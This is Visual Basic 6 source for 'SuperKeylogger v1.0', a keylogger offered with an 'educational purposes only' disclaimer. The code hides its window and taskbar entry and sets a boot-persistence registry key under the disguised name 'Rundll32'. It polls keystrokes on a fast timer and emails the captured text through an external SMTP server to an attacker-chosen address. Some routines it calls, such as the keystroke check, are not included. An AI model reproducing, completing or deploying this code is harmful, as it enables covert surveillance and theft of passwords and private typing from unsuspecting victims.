VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "SuperKeylogger v1.0----LaCRoiX"
   ClientHeight    =   1755
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   3540
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1755
   ScaleWidth      =   3540
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   WindowState     =   1  'Minimized
   Begin trojanVB6byTerabyte.SMTP SMTP 
      Height          =   375
      Left            =   3105
      TabIndex        =   4
      Top             =   255
      Width           =   750
      _ExtentX        =   1323
      _ExtentY        =   661
   End
   Begin VB.TextBox adresa 
      Alignment       =   2  'Center
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   285
      Left            =   150
      TabIndex        =   2
      Text            =   "gabrielfalcao@hotmail.com"
      Top             =   1380
      Width           =   3255
   End
   Begin VB.TextBox send 
      Height          =   285
      Left            =   0
      TabIndex        =   1
      Top             =   720
      Width           =   2895
   End
   Begin VB.Timer Timer2 
      Interval        =   1000
      Left            =   4320
      Top             =   600
   End
   Begin VB.TextBox Text1 
      Height          =   615
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   120
      Width           =   2895
   End
   Begin VB.Timer Timer1 
      Interval        =   20
      Left            =   3240
      Top             =   600
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      BackColor       =   &H00C0C000&
      BackStyle       =   0  'Transparent
      Caption         =   "Where do you want to receive the logs???"
      Height          =   885
      Left            =   -90
      TabIndex        =   3
      Top             =   1125
      Width           =   3690
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'Trimbitas Sorin, 18/06/2003
'For any suggestions/questions... feel free to mail me at
'<szt@go.ro(NOSPAM)>
'version 1.1
'Use the program ONLY for EDUCATIONAL purposes
'The file SMTP.ctl is downloaded from http://www.winsock.com.ALL
'the rest of the code is my own work!!
'Enjoy it


Option Explicit

Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Const REG As Long = 1
Const HKEY_LOCAL_MACHINE As Long = &H80000002
Const STANDARD_RIGHTS_ALL = &H1F0000
Const KEY_CREATE_LINK = &H20
Const KEY_CREATE_SUB_KEY = &H4
Const KEY_ENUMERATE_SUB_KEYS = &H8
Const KEY_NOTIFY = &H10
Const KEY_QUERY_VALUE = &H1
Const KEY_SET_VALUE = &H2
Const SYNCHRONIZE = &H100000
Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or KEY_QUERY_VALUE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or KEY_CREATE_LINK) And (Not SYNCHRONIZE))

Function IntrareRegistru()
Dim a As Long
RegOpenKeyExA HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices", 0, KEY_ALL_ACCESS, a
RegSetValueExA a, "Rundll32", 0, REG, "C:\Windows\system\rundl32.exe", 1
RegCloseKey a
End Function

Function IntrareSuportMagnetic()
Dim s As String, path As String
s = App.path & "\" & App.EXEName & ".exe"
path = WinDir & "SYSTEM\rundl32.exe"

End Function

Private Sub Form_Load()
IntrareRegistru
IntrareSuportMagnetic
App.TaskVisible = False
If App.PrevInstance Then
   Unload Me
End If
End Sub
'---
'----
Public Function SendEMail(adress As String)
With SMTP
  .Server = "s1.go.ro"
  .Port = 25
  .MailFrom = "keylogger@nesheret.test"
  .MailTo = adresa.Text
  .NameFrom = "Educational"
  .NameTo = "Mg"
  .Subject = "Keylogger"
  .Body = send.Text
  .SendMail
End With
SMTP.ccl
End Function

'----
Private Sub Timer1_Timer()
VerificareTaste
End Sub


Private Sub Timer2_Timer()
Salveaza
If VI = True Then
 Decizie
End If
End Sub

